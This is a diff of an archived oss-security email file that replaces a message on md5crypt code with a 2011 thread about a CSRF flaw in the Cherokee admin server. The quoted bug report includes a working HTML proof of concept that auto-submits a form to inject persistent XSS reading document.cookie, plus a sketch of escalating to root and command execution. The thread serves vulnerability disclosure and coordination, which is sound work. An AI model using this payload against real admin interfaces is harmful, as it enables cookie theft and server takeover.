@@ -1,32 +1,99 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/15/10
-Message-ID: <20111115195234.GA10067@openwall.com>
-Date: Tue, 15 Nov 2011 23:52:34 +0400
-From: Solar Designer <solar@...nwall.com>
-To: dillon@...llo.backplane.com, Nolan Lum <nol888@...il.com>, Colin Percival <cperciva@...ebsd.org>, deraadt@...nbsd.org, Todd Miller <Todd.Miller@...rtesan.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/06/13
+Message-ID: <BANLkTi=q8-BiuqSd6HupFgqm3eSwE3_XNg@mail.gmail.com>
+Date: Mon, 6 Jun 2011 19:03:25 +0200
+From: Alvaro Lopez Ortega <alvaro@...ality.com>
+To: Jamie Strandboge <jamie@...onical.com>
 Cc: oss-security@...ts.openwall.com
-Subject: Re: weird crypt-sha* in DragonFly BSD
+Subject: Re: Security issue in cherokee
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Nov 15, 2011 at 06:35:02AM +0400, Solar Designer wrote:
-> There's also minor weirdness in the code - such as two local pointer
-> variables being declared static seemingly for no reason, and only
-> "final" but not "ctx" being zeroized in the end.  But even this lack of
-> proper cleanup is very minor compared to the lack of stretching.
+Hello Jamie,
 
-It turns out that these other minor issues were inherited from phk's
-md5crypt.c from FreeBSD.
+First of all, thanks for the notice.
 
-Currently in FreeBSD, crypt-md5.c: crypt_md5() has extra static
-declarations (not only the output buffer, but also three pointers), and
-it forgets to zeroize ctx and ctx1 (even though it does zeroize final).
+I've been thinking about this, and I must confess I haven't found a suitable
+solution to the problem. I have even written a patch that mitigates the
+issue, although it isn't still the proper solution. Allow me to elaborate a
+little bit:
 
-md5crypt.c: __md5crypt() in NetBSD no longer has the extra statics, but
-it does forget to zeroize ctx and ctx1.
 
-md5crypt.c: md5crypt() in OpenBSD has the weird static pointers and
-forgets to zeroize ctx and ctx1.
+   - Cherokee-admin already puts a security cookie in place. The back-end
+   checks on every single requests (GET and POST). Of course this does not
+   solve the problem. Since the browser already knows the cookie, it sends it
+   even while begin CRSF'ed.
+   - I have cooked a patch that adds a "key=<random>" validation key to
+   every single form of the application. It does work to protect against some
+   very basic CRSF attacks, although it is not completely secure.
+   Web browser are not supposed to allow to perform cross-domain requests,
+   but they do. The problem is obvious then. The attacker could GET one of the
+   app pages, extract the POST validation key and use it to get his POST
+   accepted by the application.
+   - I do not even mention useless techniques like checking the Referrer
+   header.
 
-Not a big deal, but worth fixing, I think.
+Am I missing something?
+Is there any idea/proposal on how to fix up the issue properly?
 
-Alexander
+Cheers!
+
+
+On Fri, Jun 3, 2011 at 6:01 PM, Jamie Strandboge <jamie@...onical.com>wrote:
+
+> A security bug was reported against cherokee in Ubuntu. You are being
+> emailed as the upstream contact. Please keep oss-security[1] CC'd for
+> any updates on this issue.
+>
+> This issue should be considered public, but has not yet been assigned a
+> CVE. Once a CVE is assigned, please mention it in any changelogs.
+>
+> Details from the public bug follow:
+> https://launchpad.net/bugs/784632
+>
+> From the reporter:
+> ----
+> The cherokee admin server is vulnerable to csrf.
+>
+> Using csrf it is possible to produce a persistent xss in several pages -
+> including the 'status' page via the 'nickname field' of a vserver.
+> An example of this is the following:
+>
+> <html>
+> <body>
+>  <form action="http://127.0.0.1:9090/vserver/apply" method="post"
+> id="xssform">
+>  <input type="text" name="tmp!new_droot" value='/var/www/'></input>
+>  <input type="text" name="tmp!new_nick" value='" onselect=alert(1)
+> autofocus> <embed src="javascript:alert(document.cookie)">'></input>
+> </form>
+> <script>document.getElementById("xssform").submit();</script>
+> </body>
+>
+> A Worst case scenario could be something like the following:
+> If a user is logged in and the cherokee admin server is running on
+> localhost:9090 then if they visit a $bad page - the bad page may be able
+> to send requests to the server so as to reconfigure it to:
+>
+> 1. run as root
+> 2. the logging of error(or access) will run a command ...
+> ----
+>
+> Thanks in advance for your cooperation in coordinating a fix for this
+> issue,
+>
+> Jamie Strandboge
+>
+> [1] oss-security@...ts.openwall.com is a public mailing list for
+>    people to collaborate on security vulnerabilities and coordinate
+>    security updates.
+>
+> --
+> Jamie Strandboge             | http://www.canonical.com
+>
+
+
+
+-- 
+Greetings, alo
+http://www.octality.com/
+
